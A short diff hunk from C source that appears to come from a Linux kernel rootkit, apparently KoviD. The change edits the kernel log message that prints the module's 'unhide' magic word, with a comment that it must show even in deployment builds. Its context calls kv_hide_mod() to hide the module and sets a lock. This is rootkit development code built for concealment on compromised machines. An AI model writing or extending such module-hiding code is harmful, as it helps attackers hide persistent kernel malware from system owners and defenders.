@@ -852,7 +852,8 @@ cont:
     load_hidden_string("[kovid]");
 
 #ifndef DEBUG_RING_BUFFER
-    prinfo("Your module \'unhide\' magic word is: '%s'\n", magic_word);
+    /** *pr_info because it must be shown even if DEPLOY=1 */
+    pr_info("Your module \'unhide\' magic word is: '%s'\n", magik);
     kv_hide_mod();
     op_lock = 1;
 #endif
